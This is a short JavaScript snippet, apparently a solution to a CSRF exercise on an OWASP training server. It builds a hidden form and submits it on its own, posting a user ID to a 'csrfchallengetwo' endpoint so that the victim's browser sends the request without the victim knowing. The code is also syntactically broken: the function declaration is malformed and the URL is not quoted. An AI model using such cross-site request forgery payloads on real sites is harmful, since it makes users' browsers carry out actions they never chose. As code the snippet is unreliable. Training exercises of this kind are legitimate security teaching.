function a() = {
    var form = document.createElement("form");
    form.setAttribute("method", "post");
    form.setAttribute("action", https://owasp02.tic.eia-fr.ch/user/csrfchallengetwo/plusplus);

    params={userid: 1234}
    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
        }
    }

    document.body.appendChild(form);
    form.submit(); 
}

a();
